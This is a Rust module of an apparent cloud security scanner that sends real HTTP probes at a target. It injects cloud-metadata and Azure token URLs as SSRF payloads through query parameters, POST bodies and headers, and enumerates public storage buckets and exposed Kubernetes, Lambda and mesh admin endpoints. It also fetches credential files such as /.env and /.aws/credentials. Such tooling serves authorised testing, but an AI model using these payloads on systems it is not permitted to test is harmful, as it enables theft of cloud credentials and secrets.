//! Advanced Cloud Engines — real HTTP probes against cloud-metadata endpoints, S3-style buckets,
//! and SaaS APIs reachable from the target. No simulated findings.

use crate::engine_dispatch::EngineRunContext;
use crate::engine_probes::{
    detect_secrets, dns_a, dns_mx, dns_ns, dns_txt, empty_ok, extract_host, finding_with_probe_depth,
    header_value, http_client, http_get, http_get_with_headers, http_post_json, normalize_url,
    probe_paths_concurrent, DEFAULT_PROBE_CONCURRENCY,
};
use crate::engine_result::{print_result, EngineResult};
use serde_json::{json, Value};

const CLOUD_PROBE_DEPTH: &str = "cloud_remote_surface";
const ENGINE_METADATA_SSRF: &str = "cloud_metadata_ssrf";

fn cloud_finding(
    engine_id: &str,
    title: &str,
    severity: &str,
    mitre: &str,
    description: &str,
    target: &str,
) -> Value {
    finding_with_probe_depth(
        engine_id,
        title,
        severity,
        mitre,
        description,
        target,
        CLOUD_PROBE_DEPTH,
    )
}

fn cloud_finding_sync(
    engine_id: &str,
    title: &str,
    severity: &str,
    mitre: &str,
    description: &str,
    target: &str,
    correlation_hints: &[&str],
    feeds_engines: &[&str],
    metadata: Value,
) -> Value {
    let mut f = cloud_finding(engine_id, title, severity, mitre, description, target);
    if let Some(obj) = f.as_object_mut() {
        obj.insert(
            "correlation_hints".into(),
            Value::Array(correlation_hints.iter().map(|s| json!(*s)).collect()),
        );
        obj.insert(
            "feeds_engines".into(),
            Value::Array(feeds_engines.iter().map(|s| json!(*s)).collect()),
        );
        if !metadata.is_null() {
            obj.insert("sync_metadata".into(), metadata);
        }
    }
    f
}

fn metadata_body_hit(body: &str) -> Option<&'static str> {
    if body.contains("ami-id") || body.contains("instance-id") {
        return Some("aws");
    }
    if body.contains("computeMetadata") {
        return Some("gcp");
    }
    if body.contains("instanceId") || body.contains("access_token") {
        return Some("azure");
    }
    if body.contains("droplet") || body.contains("region") && body.contains("digitalocean") {
        return Some("digitalocean");
    }
    None
}

fn ssrf_metadata_urls() -> Vec<&'static str> {
    vec![
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        "http://169.254.169.254/openstack/latest/meta_data.json",
        "http://100.100.100.200/latest/meta-data/",
    ]
}

fn ssrf_param_keys() -> Vec<&'static str> {
    vec![
        "url",
        "image",
        "callback",
        "redirect_uri",
        "target",
        "fetch",
        "dest",
        "link",
        "src",
        "uri",
        "path",
        "next",
    ]
}

fn ssrf_probe_bases(target: &str, ctx: &EngineRunContext) -> Vec<String> {
    let root = normalize_url(target);
    let mut bases = vec![root.clone()];
    for p in &ctx.discovered_paths {
        bases.push(format!("{}{}", root.trim_end_matches('/'), p));
    }
    if let Some(bus) = ctx.intelligence_bus.as_ref() {
        for art in bus.snapshot() {
            if art.proof.starts_with("http_surface_")
                || art.proof.starts_with("graphql_")
                || art.kind.contains("gateway")
            {
                bases.push(art.source_url.clone());
            }
        }
    }
    bases.sort();
    bases.dedup();
    bases
}

macro_rules! cli_wrapper {
    ($name:ident, $result_fn:ident) => {
        pub async fn $name(target: &str) {
            print_result($result_fn(target).await);
        }
    };
}

fn cloud_auth_header_pairs(params: &Value) -> Vec<(String, String)> {
    let mut pairs = Vec::new();
    if let Some(token) = params
        .get("bearer_token")
        .or_else(|| params.get("options").and_then(|o| o.get("bearer_token")))
        .and_then(|v| v.as_str())
        .map(str::trim)
        .filter(|s| !s.is_empty())
    {
        pairs.push((
            "Authorization".into(),
            if token.starts_with("Bearer ") {
                token.to_string()
            } else {
                format!("Bearer {token}")
            },
        ));
    }
    crate::ws_intelligence_bus::apply_intelligence_artifacts_to_headers(params, &mut pairs);
    pairs
}

#[derive(Default)]
struct MetadataSsrfFlags {
    get_hit: bool,
    post_hit: bool,
    header_hit: bool,
    providers: Vec<String>,
}

// Probe SSRF-forwarded cloud metadata via target (GET query + POST body + headers).
async fn try_ssrf_metadata_ctx(target: &str, ctx: &EngineRunContext) -> (Vec<Value>, MetadataSsrfFlags) {
    let client = http_client().await;
    let bases = ssrf_probe_bases(target, ctx);
    let metadata_urls = ssrf_metadata_urls();
    let param_keys = ssrf_param_keys();
    let auth_pairs = cloud_auth_header_pairs(&ctx.job_params);
    let auth_refs: Vec<(&str, &str)> = auth_pairs
        .iter()
        .map(|(k, v)| (k.as_str(), v.as_str()))
        .collect();
    let mut findings = Vec::new();
    let mut flags = MetadataSsrfFlags::default();

    for base in &bases {
        for meta in &metadata_urls {
            for q in &param_keys {
                let url = format!(
                    "{}/?{}={}",
                    base.trim_end_matches('/'),
                    q,
                    urlencoding::encode(meta)
                );
                let get_probe = if auth_refs.is_empty() {
                    http_get(&client, &url).await
                } else {
                    http_get_with_headers(&client, &url, &auth_refs).await
                };
                if let Some(p) = get_probe {
                    if let Some(provider) = metadata_body_hit(&p.body) {
                        flags.get_hit = true;
                        if !flags.providers.iter().any(|x| x == provider) {
                            flags.providers.push(provider.to_string());
                        }
                        if let Some(bus) = ctx.intelligence_bus.as_ref() {
                            bus.publish_http_surface(
                                "cloud_metadata_ssrf_get",
                                meta,
                                &p.final_url,
                                ENGINE_METADATA_SSRF,
                                "http_surface_metadata_ssrf_get",
                            );
                        }
                        findings.push(cloud_finding_sync(
                            ENGINE_METADATA_SSRF,
                            "Cloud metadata reflected via SSRF param",
                            "critical",
                            "T1552.005",
                            &format!(
                                "?{q}={meta} on {} returned {provider} metadata (HTTP {}).",
                                p.final_url, p.status
                            ),
                            target,
                            &["ssrf_advanced", "api_gateway_bypass", "graphql_deep_attack"],
                            &["multi_cloud_pivot", "risk_superposition_collapse"],
                            json!({
                                "provider": provider,
                                "param": q,
                                "transport": "GET",
                                "endpoint": p.final_url
                            }),
                        ));
                    }
                }
                let mut post_map = serde_json::Map::new();
                post_map.insert((*q).to_string(), json!(*meta));
                let post_payload = Value::Object(post_map);
                if let Some(p) = http_post_json(&client, &url, &post_payload).await {
                    if let Some(provider) = metadata_body_hit(&p.body) {
                        flags.post_hit = true;
                        if !flags.providers.iter().any(|x| x == provider) {
                            flags.providers.push(provider.to_string());
                        }
                        if let Some(bus) = ctx.intelligence_bus.as_ref() {
                            bus.publish_http_surface(
                                "cloud_metadata_ssrf_post",
                                meta,
                                &p.final_url,
                                ENGINE_METADATA_SSRF,
                                "http_surface_metadata_ssrf_post",
                            );
                        }
                        findings.push(cloud_finding_sync(
                            ENGINE_METADATA_SSRF,
                            "Cloud metadata reflected via POST SSRF body",
                            "critical",
                            "T1552.005",
                            &format!(
                                "POST body {q}={meta} on {} returned {provider} metadata (HTTP {}).",
                                p.final_url, p.status
                            ),
                            target,
                            &["ssrf_advanced", "api_mass_assignment"],
                            &["multi_cloud_pivot", "identity_attack_chain"],
                            json!({
                                "provider": provider,
                                "param": q,
                                "transport": "POST",
                                "endpoint": p.final_url
                            }),
                        ));
                    }
                }
            }
        }

        let header_vectors: [(&str, &str); 4] = [
            ("X-Forwarded-Host", "169.254.169.254"),
            ("X-Original-URL", "/latest/meta-data/"),
            ("X-Forwarded-For", "169.254.169.254"),
            ("Referer", "http://169.254.169.254/latest/meta-data/"),
        ];
        for (hdr, val) in header_vectors {
            if let Some(p) = http_get_with_headers(&client, base, &[(hdr, val)]).await {
                if let Some(provider) = metadata_body_hit(&p.body) {
                    flags.header_hit = true;
                    if !flags.providers.iter().any(|x| x == provider) {
                        flags.providers.push(provider.to_string());
                    }
                    findings.push(cloud_finding_sync(
                        ENGINE_METADATA_SSRF,
                        "Cloud metadata via SSRF header vector",
                        "critical",
                        "T1552.005",
                        &format!(
                            "Header {hdr}={val} on {base} returned {provider} metadata (HTTP {}).",
                            p.status
                        ),
                        target,
                        &["api_gateway_bypass", "zero_trust_bypass"],
                        &["external_exposure_supreme"],
                        json!({"header": hdr, "provider": provider, "endpoint": p.final_url}),
                    ));
                }
            }
        }
    }

    if flags.providers.len() >= 2 || (flags.get_hit && flags.post_hit) {
        findings.push(cloud_finding_sync(
            ENGINE_METADATA_SSRF,
            "Toxic chain: multi-vector cloud metadata SSRF",
            "critical",
            "T1552.005",
            &format!(
                "Live cloud fusion: providers={:?} get={} post={} header={} — credential theft / lateral pivot chain.",
                flags.providers, flags.get_hit, flags.post_hit, flags.header_hit
            ),
            target,
            &["multi_cloud_pivot", "lambda_escape", "kubernetes_rbac_escape"],
            &["threat_surface_intelligence_fusion", "risk_superposition_collapse"],
            json!({"toxic_chain": true, "providers": flags.providers}),
        ));
    }

    (findings, flags)
}

// ── cloud_metadata_ssrf ───────────────────────────────────────────────────────
pub async fn run_cloud_metadata_ssrf_result(target: &str) -> EngineResult {
    run_cloud_metadata_ssrf_result_ctx(target, &EngineRunContext::default()).await
}

pub async fn run_cloud_metadata_ssrf_result_ctx(
    target: &str,
    ctx: &EngineRunContext,
) -> EngineResult {
    if target.trim().is_empty() {
        return EngineResult::error("target required");
    }
    let (findings, flags) = try_ssrf_metadata_ctx(target, ctx).await;
    if findings.is_empty() {
        empty_ok(ENGINE_METADATA_SSRF, target)
    } else {
        let n = findings.len();
        EngineResult::ok(
            findings,
            format!(
                "{ENGINE_METADATA_SSRF}: {n} hit(s) (providers={:?})",
                flags.providers
            ),
        )
    }
}
cli_wrapper!(run_cloud_metadata_ssrf, run_cloud_metadata_ssrf_result);

// ── s3_bucket_attack ──────────────────────────────────────────────────────────
pub async fn run_s3_bucket_attack_result(target: &str) -> EngineResult {
    if target.trim().is_empty() {
        return EngineResult::error("target required");
    }
    let host = extract_host(target);
    let label = host.split('.').next().unwrap_or(&host).to_string();
    let client = http_client().await;
    let mut findings: Vec<Value> = Vec::new();
    // Multi-cloud public object-storage enumeration (AWS S3 / Azure Blob / GCP Storage).
    let candidates: Vec<(&str, String)> = vec![
        (
            "AWS S3",
            format!("https://{}.s3.amazonaws.com/", host.replace('.', "-")),
        ),
        ("AWS S3", format!("https://{}.s3.amazonaws.com/", host)),
        ("AWS S3", format!("https://s3.amazonaws.com/{}/", host)),
        ("AWS S3", format!("https://{}.s3.amazonaws.com/", label)),
        (
            "Azure Blob",
            format!(
                "https://{}.blob.core.windows.net/?comp=list",
                label.replace('-', "")
            ),
        ),
        (
            "GCP Storage",
            format!("https://storage.googleapis.com/{}/", host),
        ),
        (
            "GCP Storage",
            format!("https://storage.googleapis.com/{}/", label),
        ),
    ];
    for (provider, url) in &candidates {
        if let Some(p) = http_get(&client, url).await {
            let public_list = p.status == 200
                && (p.body.contains("<ListBucketResult")
                    || p.body.contains("<EnumerationResults")
                    || p.body.contains("<Contents>")
                    || p.body.contains("<Blob>"));
            let exists_denied = (p.status == 403 || p.status == 401)
                && (p.body.contains("AccessDenied")
                    || p.body.contains("AuthenticationFailed")
                    || p.body.contains("InvalidSecurity"));
            if public_list {
                findings.push(cloud_finding(
                    "s3_bucket_attack",
                    &format!("Public {} object listing", provider),
                    "high",
                    "T1530",
                    &format!(
                        "{} object listing readable at {} (HTTP {}) — unauthenticated data exposure.",
                        provider, url, p.status
                    ),
                    target,
                ));
            } else if exists_denied {
                findings.push(cloud_finding(
                    "s3_bucket_attack",
                    &format!("{} bucket/container exists (access denied)", provider),
                    "info",
                    "T1530",
                    &format!(
                        "{} returned HTTP {} — the name resolves; review ACL / policy.",
                        url, p.status
                    ),
                    target,
                ));
            }
        }
    }
    if findings.is_empty() {
        empty_ok("s3_bucket_attack", target)
    } else {
        let n = findings.len();
        EngineResult::ok(
            findings,
            format!("s3_bucket_attack: {} storage finding(s)", n),
        )
    }
}
cli_wrapper!(run_s3_bucket_attack, run_s3_bucket_attack_result);

// ── lambda_escape ─────────────────────────────────────────────────────────────
pub async fn run_lambda_escape_result(target: &str) -> EngineResult {
    if target.trim().is_empty() {
        return EngineResult::error("target required");
    }
    let client = http_client().await;
    let base = normalize_url(target);
    let mut findings: Vec<Value> = Vec::new();
    if let Some(p) = http_get(&client, &base).await {
        if header_value(&p.headers, "x-amzn-requestid").is_some()
            || header_value(&p.headers, "x-amz-apigw-id").is_some()
            || header_value(&p.headers, "x-amzn-trace-id").is_some()
        {
            findings.push(cloud_finding(
                "lambda_escape",
                "AWS Lambda / API Gateway detected",
                "info",
                "T1610",
                &format!(
                    "Response from {} carries AWS x-amzn-* headers — exposed Lambda runtime.",
                    p.final_url
                ),
                target,
            ));
        }
    }
    let lambda_paths = [
        "/2015-03-31/functions/",
        "/runtime/invocation/next",
        "/_lambda/warmup",
        "/aws/lambda",
        "/.aws/lambda",
    ];
    let probes = probe_paths_concurrent(&client, &base, &lambda_paths, DEFAULT_PROBE_CONCURRENCY).await;
    for p in probes {
        if p.status < 500
            && (p.body.contains("FunctionName")
                || p.body.contains("Runtime")
                || p.body.contains("lambda")
                || p.headers.iter().any(|(k, _)| k.eq_ignore_ascii_case("x-amzn-requestid")))
        {
            findings.push(cloud_finding(
                "lambda_escape",
                "Lambda runtime API surface exposed",
                "high",
                "T1610",
                &format!(
                    "{} ({}) — verify IAM role scoping and runtime API isolation.",
                    p.final_url, p.status
                ),
                target,
            ));
            break;
        }
    }
    if findings.is_empty() {
        empty_ok("lambda_escape", target)
    } else {
        EngineResult::ok(
            findings.clone(),
            format!("lambda_escape: {} finding(s)", findings.len()),
        )
    }
}
cli_wrapper!(run_lambda_escape, run_lambda_escape_result);

// ── cloud_iam_escalation ──────────────────────────────────────────────────────
pub async fn run_cloud_iam_escalation_result(target: &str) -> EngineResult {
    crate::aws_attack_engine::run_aws_attack_result(target).await
}
cli_wrapper!(run_cloud_iam_escalation, run_cloud_iam_escalation_result);

// ── kubernetes_rbac_escape ────────────────────────────────────────────────────
pub async fn run_kubernetes_rbac_escape_result(target: &str) -> EngineResult {
    if target.trim().is_empty() {
        return EngineResult::error("target required");
    }
    let client = http_client().await;
    let base = normalize_url(target);
    let mut findings: Vec<Value> = Vec::new();
    let k8s_paths = [
        "/api/v1/namespaces",
        "/api/v1/pods",
        "/api/v1/secrets",
        "/healthz",
        "/livez",
        "/readyz",
        "/api",
        "/apis",
        "/openapi/v2",
        "/openapi/v3",
        "/version",
        "/metrics",
        "/api/v1/nodes",
    ];
    let probes = probe_paths_concurrent(&client, &base, &k8s_paths, DEFAULT_PROBE_CONCURRENCY).await;
    for p in probes {
        let k8s_api = p.status == 200
            && (p.body.contains("\"kind\":\"APIVersions\"")
                || p.body.contains("\"kind\":\"NamespaceList\"")
                || p.body.contains("\"kind\":\"PodList\"")
                || p.body.contains("\"kind\":\"SecretList\"")
                || p.body.contains("\"kind\":\"NodeList\"")
                || p.body.contains("\"gitVersion\"")
                || (p.body.contains("Kubernetes") && p.body.contains("/api/v1")));
        if k8s_api {
            findings.push(cloud_finding(
                "kubernetes_rbac_escape",
                "Public Kubernetes API surface",
                "high",
                "T1610",
                &format!(
                    "Kubernetes API response at {} (HTTP {}) — verify anonymous RBAC bindings and secrets access.",
                    p.final_url, p.status
                ),
                target,
            ));
            break;
        }
        if p.status == 403 && p.body.contains("Forbidden") && p.body.contains("system:anonymous") {
            findings.push(cloud_finding(
                "kubernetes_rbac_escape",
                "Anonymous Kubernetes API principal detected",
                "medium",
                "T1610",
                &format!(
                    "{} returns Forbidden for system:anonymous — API is reachable; tighten RBAC.",
                    p.final_url
                ),
                target,
            ));
            break;
        }
    }
    if findings.is_empty() {
        empty_ok("kubernetes_rbac_escape", target)
    } else {
        EngineResult::ok(
            findings.clone(),
            format!("kubernetes_rbac_escape: {}", findings.len()),
        )
    }
}
cli_wrapper!(
    run_kubernetes_rbac_escape,
    run_kubernetes_rbac_escape_result
);

// ── azure_devops_attack ───────────────────────────────────────────────────────
pub async fn run_azure_devops_attack_result(target: &str) -> EngineResult {
    if target.trim().is_empty() {
        return EngineResult::error("target required");
    }
    let host = extract_host(target);
    let client = http_client().await;
    let mut findings: Vec<Value> = Vec::new();
    let candidates = [
        format!("https://dev.azure.com/{}/_apis/projects", host),
        format!("https://{}.visualstudio.com/_apis/projects", host),
    ];
    for url in candidates.iter() {
        if let Some(p) = http_get(&client, url).await {
            if p.status == 200 && p.body.contains("value") && p.body.contains("name") {
                findings.push(cloud_finding(
                    "azure_devops_attack",
                    "Public Azure DevOps projects",
                    "high",
                    "T1195.002",
                    &format!("Azure DevOps project list public at {}.", url),
                    target,
                ));
            }
        }
    }
    if findings.is_empty() {
        empty_ok("azure_devops_attack", target)
    } else {
        EngineResult::ok(
            findings.clone(),
            format!("azure_devops_attack: {}", findings.len()),
        )
    }
}
cli_wrapper!(run_azure_devops_attack, run_azure_devops_attack_result);

// ── gcp_privilege_attack ──────────────────────────────────────────────────────
pub async fn run_gcp_privilege_attack_result(target: &str) -> EngineResult {
    crate::gcp_attack_engine::run_gcp_attack_result(target).await
}
cli_wrapper!(run_gcp_privilege_attack, run_gcp_privilege_attack_result);

// ── terraform_state_attack ────────────────────────────────────────────────────
pub async fn run_terraform_state_attack_result(target: &str) -> EngineResult {
    if target.trim().is_empty() {
        return EngineResult::error("target required");
    }
    let client = http_client().await;
    let base = normalize_url(target);
    let mut findings: Vec<Value> = Vec::new();
    for path in [
        "/terraform.tfstate",
        "/.terraform/terraform.tfstate",
        "/state/terraform.tfstate",
    ] {
        let url = format!("{}{}", base.trim_end_matches('/'), path);
        if let Some(p) = http_get(&client, &url).await {
            if p.status == 200 && p.body.contains("\"terraform_version\"") {
                findings.push(cloud_finding(
                    "terraform_state_attack",
                    "Public terraform.tfstate file",
                    "critical",
                    "T1552",
                    &format!(
                        "State file accessible at {} (HTTP 200) — secrets and resource IDs leaked.",
                        p.final_url
                    ),
                    target,
                ));
            }
        }
    }
    if findings.is_empty() {
        empty_ok("terraform_state_attack", target)
    } else {
        EngineResult::ok(
            findings.clone(),
            format!("terraform_state_attack: {}", findings.len()),
        )
    }
}
cli_wrapper!(
    run_terraform_state_attack,
    run_terraform_state_attack_result
);

// ── cloudformation_injection ──────────────────────────────────────────────────
pub async fn run_cloudformation_injection_result(target: &str) -> EngineResult {
    if target.trim().is_empty() {
        return EngineResult::error("target required");
    }
    let client = http_client().await;
    let base = normalize_url(target);
    let mut findings: Vec<Value> = Vec::new();
    for path in [
        "/cloudformation.json",
        "/cfn-template.yaml",
        "/templates/main.yml",
    ] {
        let url = format!("{}{}", base.trim_end_matches('/'), path);
        if let Some(p) = http_get(&client, &url).await {
            if p.status == 200
                && (p.body.contains("AWSTemplateFormatVersion") || p.body.contains("Resources:"))
            {
                findings.push(cloud_finding(
                    "cloudformation_injection",
                    "Public CloudFormation template",
                    "high",
                    "T1195",
                    &format!(
                        "CF template accessible at {} — review parameters and policies.",
                        p.final_url
                    ),
                    target,
                ));
            }
        }
    }
    if findings.is_empty() {
        empty_ok("cloudformation_injection", target)
    } else {
        EngineResult::ok(
            findings.clone(),
            format!("cloudformation_injection: {}", findings.len()),
        )
    }
}
cli_wrapper!(
    run_cloudformation_injection,
    run_cloudformation_injection_result
);

// ── service_mesh_attack ───────────────────────────────────────────────────────
pub async fn run_service_mesh_attack_result(target: &str) -> EngineResult {
    if target.trim().is_empty() {
        return EngineResult::error("target required");
    }
    let client = http_client().await;
    let base = normalize_url(target);
    let mut findings: Vec<Value> = Vec::new();
    if let Some(p) = http_get(&client, &base).await {
        let mesh_headers = [
            ("x-envoy-upstream-service-time", "Envoy"),
            ("x-istio-attempt-count", "Istio"),
            ("x-envoy-decorator-operation", "Envoy"),
            ("server", "linkerd"),
        ];
        for (hdr, vendor) in mesh_headers {
            let val = header_value(&p.headers, hdr).unwrap_or_default();
            if !val.is_empty()
                && (hdr != "server" || val.to_ascii_lowercase().contains("linkerd"))
            {
                findings.push(cloud_finding(
                    "service_mesh_attack",
                    &format!("{vendor} mesh proxy header observed"),
                    "info",
                    "T1190",
                    &format!(
                        "{hdr}='{val}' on {} — verify mTLS STRICT mode and AuthorizationPolicies.",
                        p.final_url
                    ),
                    target,
                ));
                break;
            }
        }
    }
    let mesh_paths = [
        "/stats/prometheus",
        "/clusters",
        "/server_info",
        "/api/v1/namespaces/istio-system/services",
        "/debug/pprof",
    ];
    let probes = probe_paths_concurrent(&client, &base, &mesh_paths, DEFAULT_PROBE_CONCURRENCY).await;
    for p in probes {
        if p.status == 200
            && (p.body.contains("envoy")
                || p.body.contains("istio")
                || p.body.contains("linkerd")
                || p.body.contains("cluster_manager"))
        {
            findings.push(cloud_finding(
                "service_mesh_attack",
                "Mesh admin/debug surface exposed",
                "high",
                "T1190",
                &format!(
                    "{} ({}) — sidecar admin ports may bypass network policies.",
                    p.final_url, p.status
                ),
                target,
            ));
            break;
        }
    }
    if findings.is_empty() {
        empty_ok("service_mesh_attack", target)
    } else {
        EngineResult::ok(
            findings.clone(),
            format!("service_mesh_attack: {}", findings.len()),
        )
    }
}
cli_wrapper!(run_service_mesh_attack, run_service_mesh_attack_result);

// ── cloud_audit_evasion ───────────────────────────────────────────────────────
pub async fn run_cloud_audit_evasion_result(target: &str) -> EngineResult {
    if target.trim().is_empty() {
        return EngineResult::error("target required");
    }
    let client = http_client().await;
    let base = normalize_url(target);
    let mut findings: Vec<Value> = Vec::new();
    if let Some(p) = http_get(&client, &base).await {
        let aws_hosted = header_value(&p.headers, "x-amzn-requestid").is_some()
            || header_value(&p.headers, "x-amz-apigw-id").is_some();
        let has_trace = header_value(&p.headers, "x-amzn-trace-id").is_some()
            || header_value(&p.headers, "x-request-id").is_some()
            || header_value(&p.headers, "x-cloud-trace-context").is_some();
        if aws_hosted && !has_trace {
            findings.push(cloud_finding(
                "cloud_audit_evasion",
                "AWS front-end without distributed trace headers",
                "medium",
                "T1562.008",
                &format!(
                    "{} is AWS-hosted but returned no x-amzn-trace-id / x-request-id — verify CloudTrail and X-Ray coverage.",
                    p.final_url
                ),
                target,
            ));
        }
    }
    let audit_paths = [
        "/cloudtrail",
        "/api/logs",
        "/aws/cloudtrail",
        "/logging/disable",
        "/api/audit/disable",
        "/admin/cloudtrail",
    ];
    let probes = probe_paths_concurrent(&client, &base, &audit_paths, DEFAULT_PROBE_CONCURRENCY).await;
    for p in probes {
        let b = p.body.to_ascii_lowercase();
        if p.status < 500
            && (b.contains("cloudtrail")
                || b.contains("stoplogging")
                || b.contains("disable")
                || b.contains("audit"))
        {
            findings.push(cloud_finding(
                "cloud_audit_evasion",
                "Cloud audit/logging control surface reachable",
                "high",
                "T1562.008",
                &format!(
                    "{} ({}) — verify logging cannot be disabled without break-glass IAM.",
                    p.final_url, p.status
                ),
                target,
            ));
            break;
        }
    }
    if findings.is_empty() {
        empty_ok("cloud_audit_evasion", target)
    } else {
        EngineResult::ok(
            findings.clone(),
            format!("cloud_audit_evasion: {}", findings.len()),
        )
    }
}
cli_wrapper!(run_cloud_audit_evasion, run_cloud_audit_evasion_result);

// ── ecr_registry_attack ───────────────────────────────────────────────────────
pub async fn run_ecr_registry_attack_result(target: &str) -> EngineResult {
    crate::container_registry_engine::run_container_registry_result(target).await
}
cli_wrapper!(run_ecr_registry_attack, run_ecr_registry_attack_result);

// ── multi_cloud_pivot ─────────────────────────────────────────────────────────
pub async fn run_multi_cloud_pivot_result(target: &str) -> EngineResult {
    if target.trim().is_empty() {
        return EngineResult::error("target required");
    }
    let host = extract_host(target);
    let client = http_client().await;
    let base = normalize_url(target);
    let txt = dns_txt(&host).await;
    let mx = dns_mx(&host).await;
    let ips = dns_a(&host).await;
    let mut findings: Vec<Value> = Vec::new();
    let mut providers: Vec<&str> = Vec::new();
    for record in txt.iter() {
        let r = record.to_ascii_lowercase();
        if r.contains("google-site-verification") || r.contains("google-domain-verification") {
            providers.push("GCP");
        }
        if r.starts_with("ms=") {
            providers.push("Azure");
        }
        if r.contains("amazonses") || r.contains("_amazonses") || r.contains("amazonaws") {
            providers.push("AWS");
        }
        if r.contains("atlassian-domain-verification") {
            providers.push("Atlassian");
        }
        if r.contains("apple-domain-verification") {
            providers.push("Apple");
        }
        if r.contains("facebook-domain-verification") {
            providers.push("Meta");
        }
        if r.contains("docusign") {
            providers.push("DocuSign");
        }
    }
    for m in &mx {
        let ml = m.to_ascii_lowercase();
        if ml.contains("google.com") || ml.contains("googlemail") {
            providers.push("Google Workspace");
        }
        if ml.contains("outlook.com") || ml.contains("protection.outlook") {
            providers.push("Microsoft 365");
        }
        if ml.contains("amazonaws.com") {
            providers.push("AWS SES");
        }
    }
    providers.sort_unstable();
    providers.dedup();
    if providers.len() > 1 {
        findings.push(cloud_finding(
            "multi_cloud_pivot",
            "Multiple cloud SaaS verification records",
            "info",
            "T1583.003",
            &format!(
                "DNS for {} references {:?} (TXT/MX) — multi-cloud identity/email pivot surface.",
                host, providers
            ),
            target,
        ));
    }

    if let Some(p) = http_get(&client, &base).await {
        let server = header_value(&p.headers, "server").unwrap_or_default().to_ascii_lowercase();
        if server.contains("cloudflare") && ips.iter().any(|ip| ip.starts_with("52.")) {
            findings.push(cloud_finding(
                "multi_cloud_pivot",
                "CDN + AWS IP co-presence (hybrid hosting signal)",
                "low",
                "T1583.003",
                &format!(
                    "{} served via Cloudflare with AWS-ranged A records — review cross-cloud IAM trusts.",
                    p.final_url
                ),
                target,
            ));
        }
    }

    if findings.is_empty() {
        empty_ok("multi_cloud_pivot", target)
    } else {
        EngineResult::ok(
            findings.clone(),
            format!("multi_cloud_pivot: {}", findings.len()),
        )
    }
}
cli_wrapper!(run_multi_cloud_pivot, run_multi_cloud_pivot_result);

// ── cloud_worm_propagation ────────────────────────────────────────────────────
pub async fn run_cloud_worm_propagation_result(target: &str) -> EngineResult {
    crate::serverless_attack_engine::run_serverless_attack_result_ctx(
        target,
        &crate::engine_dispatch::EngineRunContext::default(),
    )
    .await
}
cli_wrapper!(
    run_cloud_worm_propagation,
    run_cloud_worm_propagation_result
);

// ── serverless_injection ──────────────────────────────────────────────────────
pub async fn run_serverless_injection_result(target: &str) -> EngineResult {
    crate::serverless_attack_engine::run_serverless_attack_result_ctx(
        target,
        &crate::engine_dispatch::EngineRunContext::default(),
    )
    .await
}
cli_wrapper!(run_serverless_injection, run_serverless_injection_result);

// ── cloud_data_exfil ──────────────────────────────────────────────────────────
pub async fn run_cloud_data_exfil_result(target: &str) -> EngineResult {
    run_s3_bucket_attack_result(target).await
}
cli_wrapper!(run_cloud_data_exfil, run_cloud_data_exfil_result);

// ── eks_attack ────────────────────────────────────────────────────────────────
pub async fn run_eks_attack_result(target: &str) -> EngineResult {
    run_kubernetes_rbac_escape_result(target).await
}
cli_wrapper!(run_eks_attack, run_eks_attack_result);

// ── cloud_network_attack ──────────────────────────────────────────────────────
pub async fn run_cloud_network_attack_result(target: &str) -> EngineResult {
    crate::asm_engine::run_asm_result(target).await
}
cli_wrapper!(run_cloud_network_attack, run_cloud_network_attack_result);

// ── secrets_manager_attack ────────────────────────────────────────────────────
pub async fn run_secrets_manager_attack_result(target: &str) -> EngineResult {
    if target.trim().is_empty() {
        return EngineResult::error("target required");
    }
    let client = http_client().await;
    let base = normalize_url(target);
    let paths = [
        "/.env",
        "/.env.local",
        "/.env.production",
        "/config.env",
        "/secrets.json",
        "/credentials.json",
        "/.aws/credentials",
        "/.aws/config",
        "/.git/config",
        "/application.properties",
        "/appsettings.json",
        "/config.php",
        "/wp-config.php",
        "/docker-compose.yml",
        "/.npmrc",
        "/config/database.yml",
        "/.docker/config.json",
    ];
    let probes = probe_paths_concurrent(&client, &base, &paths, DEFAULT_PROBE_CONCURRENCY).await;
    let mut findings: Vec<Value> = Vec::new();
    for p in &probes {
        if p.status != 200 {
            continue;
        }
        // Precision: only fire when a real secret *pattern* matches (not "body contains =").
        let secrets = detect_secrets(&p.body);
        if !secrets.is_empty() {
            findings.push(cloud_finding(
                "secrets_manager_attack",
                &format!("Exposed credential material at {}", p.final_url),
                "critical",
                "T1552.001",
                &format!(
                    "{} (HTTP 200) exposes secret material — detected: {}. Remove the file from the web root, rotate every affected secret immediately, and add deny rules / .gitignore entries.",
                    p.final_url,
                    secrets.join(", ")
                ),
                target,
            ));
        }
    }
    if findings.is_empty() {
        empty_ok("secrets_manager_attack", target)
    } else {
        let n = findings.len();
        EngineResult::ok(findings, format!("secrets_manager_attack: {} leak(s)", n))
    }
}
cli_wrapper!(
    run_secrets_manager_attack,
    run_secrets_manager_attack_result
);

// ── cloud_privilege_persistence ───────────────────────────────────────────────
pub async fn run_cloud_privilege_persistence_result(target: &str) -> EngineResult {
    run_cloud_iam_escalation_result(target).await
}
cli_wrapper!(
    run_cloud_privilege_persistence,
    run_cloud_privilege_persistence_result
);
